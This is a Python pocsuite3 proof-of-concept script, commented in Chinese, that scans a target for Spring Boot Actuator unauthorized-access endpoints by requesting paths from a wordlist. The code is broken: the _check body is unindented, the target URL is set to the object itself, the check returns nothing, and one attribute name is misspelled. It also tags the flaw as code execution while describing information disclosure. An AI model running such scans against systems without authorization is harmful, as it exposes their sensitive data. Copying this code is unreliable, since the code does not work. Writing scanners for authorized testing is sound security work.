from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class TDOArcePOC(POCBase):
    vulID = "1571"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "xans"  # PoC作者的大名
    vulDate = ""  # 漏洞公开的时间,不知道就写今天
    createDate = "2024-11-12"  # 编写 PoC 的日期
    updateDate = "2024-11-12"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://blog.csdn.net/guo15890025019/article/details/119885737"]  # 漏洞地址来源,0day不用写
    name = " spring boot actuator 未授权访问PoC"  # PoC 名称
    appPowerLink = "spring"  # 漏洞厂商主页地址
    appName = ""  # 漏洞应用名称
    appVersion = ""  # 漏洞影响版本
    vulType = VUL_TYPE.CODE_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
               spring boot actuator监控模块配置不当，可导致未授权访问，泄露大量敏感信息。
           """  # 漏洞简要描述
    pocDesc = """
               poc的用法描述
           """  # POC用法描述

    def _check(self):
    print("[+]-----检测未授权漏洞中-----")
    lis = [line.strip() for line in open('./Dic/SpringBoot-Dic', 'r')]
    url= self
    for i in lis:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE'
        }
        res=requests.get(url=url+i,headers=headers,verify=False)
        # print(res)
        if res.status_code == 200 :
            print("[+]"+url+i+"可能存在信息泄漏")


    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.pocDescS
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(TDOArcePOC)